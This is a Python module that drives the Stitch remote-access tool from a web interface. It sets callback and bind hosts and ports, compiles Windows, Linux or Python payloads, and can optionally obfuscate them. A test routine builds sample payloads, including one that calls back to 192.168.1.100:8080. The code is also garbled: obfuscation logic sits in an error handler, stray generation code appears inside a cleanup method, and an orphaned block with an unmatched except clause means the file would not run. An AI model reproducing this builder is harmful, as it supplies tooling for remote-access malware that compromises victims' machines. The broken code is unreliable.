#!/usr/bin/env python3
"""
Enhanced payload generation for web interface
Ensures proper executable generation matching terminal functionality
"""

import os
import sys
import json
import shutil
import tempfile
import base64
from pathlib import Path
from datetime import datetime
import payload_obfuscator
import fixed_payload_generator



# Add Application directory to path
sys.path.insert(0, os.path.dirname(__file__))

from Application.stitch_gen import assemble_stitch
from Application.stitch_pyld_config import stitch_ini, get_conf_dir, gen_default_st_config
from Application.stitch_utils import st_print, st_log
from Application.stitch_cross_compile import compile_payload
from Application.Stitch_Vars.globals import st_config, configuration_path, payloads_path


class WebPayloadGenerator:
    """Handles payload generation for web interface with proper executable output"""
    
    def __init__(self):
        self.last_config_dir = None
        self.last_payload_path = None
        
    def generate_payload(self, config):
        """
        Generate a Stitch payload based on configuration
        
        Args:
            config (dict): Configuration dictionary containing:
                - bind_host: Host to bind to
                - bind_port: Port to bind to
                - listen_host: Host to connect to
                - listen_port: Port to connect to
                - enable_bind: Whether to enable bind mode
                - enable_listen: Whether to enable listen mode
                - platform: Target platform ('windows', 'linux', 'python')
                - payload_name: Custom name for payload (optional)
        
        Returns:
            dict: Result dictionary containing:
                - success: Boolean indicating success
                - payload_path: Path to generated payload
                - payload_type: Type of payload ('executable' or 'script')
                - platform: Target platform
                - size: File size in bytes
                - message: Success/error message
        """
        
        # Validate configuration
        bind_host = config.get('bind_host', '')
        bind_port = config.get('bind_port', '4433')
        listen_host = config.get('listen_host', 'localhost')
        listen_port = config.get('listen_port', '4455')
        enable_bind = config.get('enable_bind', True)
        enable_listen = config.get('enable_listen', True)
        target_platform = config.get('platform', 'linux').lower()
        payload_name = config.get('payload_name', 'stitch_payload')
        
        # Validate ports (only if provided and enabled)
        try:
            if enable_bind and bind_port:
                bind_port = int(bind_port)
                if not (1 <= bind_port <= 65535):
                    return {
                        'success': False,
                        'message': 'Invalid bind port range (must be 1-65535)'
                    }
            else:
                bind_port = 0  # Default if not binding
                
            if enable_listen and listen_port:
                listen_port = int(listen_port)
                if not (1 <= listen_port <= 65535):
                    return {
                        'success': False,
                        'message': 'Invalid listen port range (must be 1-65535)'
                    }
            else:
                listen_port = 0  # Default if not listening
        except ValueError:
            return {
                'success': False,
                'message': 'Invalid port numbers - must be integers'
            }
        
        # Backup existing config
        config_backup = None
        if os.path.exists(st_config):
            config_backup = st_config + '.backup.' + datetime.now().strftime('%Y%m%d_%H%M%S')
            shutil.copy2(st_config, config_backup)
        
        try:
            # Ensure default config exists
            if not os.path.exists(st_config):
                gen_default_st_config()
            
            # Update configuration
            stini = stitch_ini()
            stini.set_value('BIND', str(enable_bind))
            stini.set_value('BHOST', bind_host)
            stini.set_value('BPORT', str(bind_port))
            stini.set_value('LISTEN', str(enable_listen))
            stini.set_value('LHOST', listen_host)
            stini.set_value('LPORT', str(listen_port))
            stini.set_value('EMAIL', 'None')
            stini.set_value('EMAIL_PWD', '')
            stini.set_value('KEYLOGGER_BOOT', 'False')
            
            # Get output directory
            conf_dir = get_conf_dir()
            self.last_config_dir = conf_dir
            
            # Generate source files
            st_print("[*] Assembling Stitch modules...")
            assemble_stitch()
            
            # Compile payload based on platform
            st_print(f"[*] Compiling payload for {target_platform}...")
            
            # Use the cross-compilation module
            payload_path = compile_payload(
                source_dir=configuration_path,
                output_dir=conf_dir,
                platform=target_platform,
                payload_name=payload_name
            )
            
            if payload_path and os.path.exists(payload_path):
                self.last_payload_path = payload_path
                
                # Determine payload type and get file info
                if payload_path.endswith('.exe'):
                    payload_type = 'executable'
                    actual_platform = 'windows'
                elif payload_path.endswith('.py'):
                    payload_type = 'script'
                    actual_platform = 'python'
                else:
                    payload_type = 'executable'
                    actual_platform = target_platform
                
                file_size = os.path.getsize(payload_path)
                
                # Create success response
                result = {
                    'success': True,
                    'payload_path': payload_path,
                    'payload_type': payload_type,
                    'platform': actual_platform,
                    'size': file_size,
                    'message': f'Successfully generated {payload_type} for {actual_platform}',
                    'config_dir': conf_dir,
                    'filename': os.path.basename(payload_path)
                }
                
                st_print(f"[+] Payload generated successfully: {payload_path}")
                st_print(f"    Type: {payload_type}, Platform: {actual_platform}, Size: {file_size} bytes")
                
                return result
            
            else:
                # Fallback to Python script if compilation failed
                st_print("[!] Compilation failed, falling back to Python script")
                
                script_path = os.path.join(configuration_path, 'st_main.py')
                if os.path.exists(script_path):
                    # Copy to output directory
                    binary_dir = os.path.join(conf_dir, 'Binaries')
                    os.makedirs(binary_dir, exist_ok=True)
                    
                    fallback_path = os.path.join(binary_dir, f'{payload_name}.py')
                    shutil.copy2(script_path, fallback_path)
                    
                    self.last_payload_path = fallback_path
                    file_size = os.path.getsize(fallback_path)
                    
                    return {
                        'success': True,
                        'payload_path': fallback_path,
                        'payload_type': 'script',
                        'platform': 'python',
                        'size': file_size,
                        'message': 'Compilation unavailable - generated Python script instead',
                        'config_dir': conf_dir,
                        'filename': os.path.basename(fallback_path),
                        'warning': 'Executable compilation failed. Python interpreter required on target.'
                    }
                else:
                    return {
                        'success': False,
                        'message': 'Failed to generate payload - no output files created'
                    }
        
        except Exception as e:
            st_log.error(f"Payload generation error: {e}")
            
            # Obfuscate if requested
            if config.get('obfuscate', False):
                try:
                    import payload_obfuscator
                    payload_obfuscator.obfuscate_file(payload_path, payload_path)
                    logger.info("Payload obfuscated")
                except Exception as e:
                    logger.warning(f"Obfuscation failed: {e}")

            return {
                'success': False,
                'message': f'Payload generation failed: {str(e)}'
            }
        
        finally:
            # Restore original config
            if config_backup and os.path.exists(config_backup):
                shutil.move(config_backup, st_config)
    
    def get_last_payload(self):
        """Get the path to the last generated payload"""
        return self.last_payload_path
    
    def cleanup_old_payloads(self, keep_last=5):
        """Clean up old payload directories, keeping the most recent ones"""
        try:
            if not os.path.exists(payloads_path):
                return  # No payloads directory
        except Exception:
            pass
                
        # Use fixed generator as primary method
        try:
            import fixed_payload_generator
            fixed_path = fixed_payload_generator.generate_working_payload(config)
            if fixed_path and os.path.exists(fixed_path):
                # Copy to payload directory
                import shutil
                final_path = os.path.join(conf_dir, os.path.basename(fixed_path))
                shutil.copy(fixed_path, final_path)
                
                session['payload_path'] = final_path
                session['payload_type'] = 'executable' if not final_path.endswith('.py') else 'python'
                
                return {
                    'success': True,
                    'payload_path': final_path,
                    'type': session['payload_type'],
                    'size': os.path.getsize(final_path),
                    'download_url': '/api/download-payload'
                }
        except Exception as e:
            logger.warning(f"Fixed generator failed: {e}")
            
        return
            
            # Get all config directories
            config_dirs = []
            for item in os.listdir(payloads_path):
                if item.startswith('config') and os.path.isdir(os.path.join(payloads_path, item)):
                    full_path = os.path.join(payloads_path, item)
                    mtime = os.path.getmtime(full_path)
                    config_dirs.append((full_path, mtime))
            
            # Sort by modification time (newest first)
            config_dirs.sort(key=lambda x: x[1], reverse=True)
            
            # Remove old directories
            for path, _ in config_dirs[keep_last:]:
                st_print(f"[*] Removing old payload directory: {path}")
                shutil.rmtree(path, ignore_errors=True)
        
        except Exception as e:
            st_log.error(f"Error cleaning up old payloads: {e}")


# Global instance
web_payload_gen = WebPayloadGenerator()


def test_payload_generation():
    """Test function to verify payload generation works"""
    
    print("="*60)
    print("Testing Web Payload Generation")
    print("="*60)
    
    # Test configurations
    test_configs = [
        {
            'name': 'Linux Binary',
            'config': {
                'bind_host': '0.0.0.0',
                'bind_port': '4433',
                'listen_host': 'localhost',
                'listen_port': '4455',
                'enable_bind': True,
                'enable_listen': False,
                'platform': 'linux',
                'payload_name': 'test_linux'
            }
        },
        {
            'name': 'Windows Executable',
            'config': {
                'bind_host': '',
                'bind_port': '4433',
                'listen_host': '192.168.1.100',
                'listen_port': '8080',
                'enable_bind': False,
                'enable_listen': True,
                'platform': 'windows',
                'payload_name': 'test_windows'
            }
        },
        {
            'name': 'Python Script',
            'config': {
                'bind_host': '0.0.0.0',
                'bind_port': '9999',
                'listen_host': '',
                'listen_port': '',
                'enable_bind': True,
                'enable_listen': False,
                'platform': 'python',
                'payload_name': 'test_python'
            }
        }
    ]
    
    for test in test_configs:
        print(f"\n[TEST] {test['name']}")
        print("-"*40)
        
        result = web_payload_gen.generate_payload(test['config'])
        
        if result['success']:
            print(f"✅ SUCCESS")
            print(f"   Path: {result['payload_path']}")
            print(f"   Type: {result['payload_type']}")
            print(f"   Platform: {result['platform']}")
            print(f"   Size: {result['size']} bytes")
            print(f"   Message: {result['message']}")
            
            # Verify file exists
            if os.path.exists(result['payload_path']):
                print(f"   ✓ File exists")
            else:
                print(f"   ✗ File missing!")
        else:
            print(f"❌ FAILED")
            print(f"   Error: {result['message']}")
    
    # Cleanup old payloads
    print("\n[*] Cleaning up old payloads...")
    web_payload_gen.cleanup_old_payloads(keep_last=3)
    
    print("\n" + "="*60)
    print("Testing Complete")
    print("="*60)


if __name__ == "__main__":
    # Run tests if executed directly
    test_payload_generation()